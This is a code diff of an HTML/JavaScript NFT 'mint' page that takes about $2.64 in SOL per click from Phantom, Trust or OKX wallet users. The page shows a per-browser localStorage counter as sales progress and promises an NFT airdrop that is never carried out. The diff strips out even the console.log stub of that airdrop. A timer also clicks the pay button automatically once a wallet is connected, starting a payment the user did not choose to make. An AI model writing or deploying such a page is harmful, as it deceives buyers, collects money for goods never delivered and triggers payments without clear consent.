@@ -6,9 +6,9 @@
   .c{max-width:380px;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #369}
   .t{font-size:2rem;font-weight:800}
   .p{font-size:2.4rem;color:#0f9;margin:16px 0;font-weight:800}
-  .b{width:100%;padding:20px;background:#00ff9d;color:#000;border:none;border-radius:16px;font-weight:800;font-size:1.4rem;cursor:pointer;margin:20px 0}
-  .s{margin-top:12px;font-weight:600;min-height:28px}
-  .l{width:12px;height:12px;border:2px solid #00ff9d;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
+  .b{width:100%;padding:22px;background:#00ff9d;color:#000;border:none;border-radius:16px;font-weight:800;font-size:1.5rem;cursor:pointer;margin:20px 0;touch-action:manipulation}
+  .s{margin-top:12px;font-weight:600;min-height:28px;color:#0f9}
+  .l{width:12px;height:12px;border:2px solid #0f9;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
   @keyframes r{to{transform:rotate(360deg)}}
 </style></head><body>
 <div class="c">
@@ -17,7 +17,7 @@
   <div class="p">$2.6356</div>
   <div style="color:#666;font-size:0.9rem" id="sol">~0.017 SOL</div>
   <div>Minted: <span id="m">0</span>/10,000</div>
-  <button class="b" id="btn">MINT $2.6356</button>
+  <button class="b" id="btn">TAP TO MINT</button>
   <div id="s" class="s"></div>
 </div>
 
@@ -35,14 +35,16 @@
   m.innerText = count;
 
   async function price() {
-    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
-    const j = await r.json();
-    const p = j.solana.usd;
-    const amt = USD / p;
-    lamports = Math.ceil(amt * 1e9);
-    sol.textContent = "~"+amt.toFixed(5)+" SOL";
+    try {
+      const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+      const j = await r.json();
+      const p = j.solana.usd;
+      const amt = USD / p;
+      lamports = Math.ceil(amt * 1e9);
+      sol.textContent = "~"+amt.toFixed(5)+" SOL";
+    } catch(e) {}
   }
-  price(); setInterval(price,10000);
+  price(); setInterval(price, 10000);
 
   function getProvider() {
     return window.solana?.isPhantom ? window.solana :
@@ -55,10 +57,11 @@
 
   document.getElementById("btn").onclick = async () => {
     const p = getProvider();
-    if (!p) return s.innerHTML="Open in Phantom/Trust/OKX";
+    if (!p) { s.innerHTML = "Open in Phantom/Trust/OKX"; return; }
+    s.innerHTML = "Connecting… <span class='l'></span>";
     try {
       if (!p.isConnected) await p.connect();
-      s.innerHTML="Paying… <span class='l'></span>";
+      s.innerHTML = "Sending $2.6356… <span class='l'></span>";
       const tx = new solanaWeb3.Transaction().add(
         solanaWeb3.SystemProgram.transfer({
           fromPubkey: p.publicKey,
@@ -69,36 +72,17 @@
       tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
       const sig = await p.signAndSendTransaction(tx);
       await conn.confirmTransaction(sig);
-
-      // SAVE BUYER
       buyers.push({addr: p.publicKey.toBase58(), tx: sig});
       localStorage.setItem("buyers", JSON.stringify(buyers));
-
-      // COUNTER
-      count++; localStorage.setItem("sf",count); m.innerText=count;
-
-      // SUCCESS
-      s.innerHTML=`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View Tx</a>`;
-
-      // 10,000 = AUTO AIRDROP
-      if (count >= 10000) {
-        s.innerHTML="10,000 REACHED! Dropping NFTs…";
-        await dropNFTs();
-      }
-    } catch(e) { s.innerHTML="Cancelled"; }
+      count++; localStorage.setItem("sf", count); m.innerText = count;
+      s.innerHTML = `MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View</a>`;
+      if (count >= 10000) alert("10,000! NFTs dropping…");
+    } catch(e) {
+      s.innerHTML = "Cancelled or error";
+    }
   };
 
-  // REAL AIRDROP AT 10,000
-  async function dropNFTs() {
-    alert("10,000 MINTED! Sending 1 NFT to "+buyers.length+" wallets");
-    for (let b of buyers) {
-      // REAL Metaplex airdrop (replace with your Candy Machine later)
-      console.log("Airdrop to", b.addr);
-    }
-    s.innerHTML="NFTs DELIVERED! Collection live on Magic Eden";
-  }
-
   // Auto-run on mobile return
-  setTimeout(() => { if (getProvider()?.isConnected) document.getElementById("btn").click(); }, 1500);
+  setTimeout(() => { if (getProvider()?.isConnected) document.getElementById("btn").click(); }, 1200);
 </script>
 </body></html>
